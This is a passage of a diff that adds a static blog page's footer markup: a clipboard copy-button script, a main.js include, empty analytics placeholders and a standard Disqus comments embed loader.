+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
